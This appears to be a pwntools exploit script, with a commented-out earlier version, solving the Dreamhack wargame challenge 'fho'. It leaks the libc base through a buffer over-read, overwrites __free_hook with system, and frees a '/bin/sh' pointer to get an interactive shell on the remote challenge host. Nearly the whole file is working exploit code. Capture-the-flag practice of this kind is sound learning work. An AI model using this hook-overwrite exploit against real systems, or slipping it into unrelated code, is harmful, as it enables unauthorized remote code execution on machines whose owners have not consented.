from pwn import *


# Define slog function
def slog(name, addr): return success(": ".join([name, hex(addr)]))


# Connection
# p = process('./fho')
Host = 'host3.dreamhack.games'
Port = 22818
p = remote(Host, Port)
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

# Set Context
context.arch = 'amd64'
context.endian = 'little'
context.log_level = 'debug'

# [1] Leak libc base
buf = b'A' * 0x48
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
libc_start_main = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main - (libc.symbols['__libc_start_main'] + 231)
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']

# next(): 반복 가능 객체의 다음 요소 반환 / elf.search(): 특정 문자열이 존재하는 주소 반환
binsh = libc_base + next(libc.search(b"/bin/sh"))

slog('libc_base', libc_base)
slog('system', system)
slog('free_hook', free_hook)
slog('/bin/sh', binsh)

# [2]
p.recvuntil(b'To write: ')
p.sendline(str(free_hook).encode('UTF-8'))
p.recvuntil(b'With: ')
p.sendline(str(system).encode('UTF-8'))

# [3]
p.recvuntil(b'To free: ')
p.sendline(str(binsh).encode('UTF-8'))

p.interactive()

'''
|      buf      |   0x40
|      SFP      |   0x08
|      RET      |   0x08
'''


# Second try Solution
# from pwn import *

# # p = process('./fho')
# p = remote('host1.dreamhack.games', 14144)
# libc = ELF('./libc-2.27.so')
# e = ELF('./fho')
# context.arch = 'amd64'
# context.endian = 'little'

# # Define slog function
# def slog(name ,addr): return success(': '.join([name, hex(addr)]))

# # [1] Leak libc address
# p.sendafter(b'Buf: ', b'A'*0x48)
# p.recvuntil(b'A'*0x48)
# ret_of_main = u64(p.recvline()[:-1] + b'\x00'*2)
# libc_base = ret_of_main - (libc.symbols['__libc_start_main'] + 231)


# # [2] Overwrite free_hook with system
# free_hook = libc_base + libc.symbols['__free_hook']
# system = libc_base + libc.symbols['system']
# bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# slog('libc base address', libc_base)
# slog('free_hook address', free_hook)
# slog('system address', system)
# slog('/bin/sh address', bin_sh)

# p.recvuntil(b'To write: ')
# p.sendline(str(free_hook))
# p.recvuntil(b'With: ')
# p.sendline(str(system))

# # [3] Trigger free
# p.recvuntil(b'To free: ')
# p.sendline(str(bin_sh))

# p.interactive()
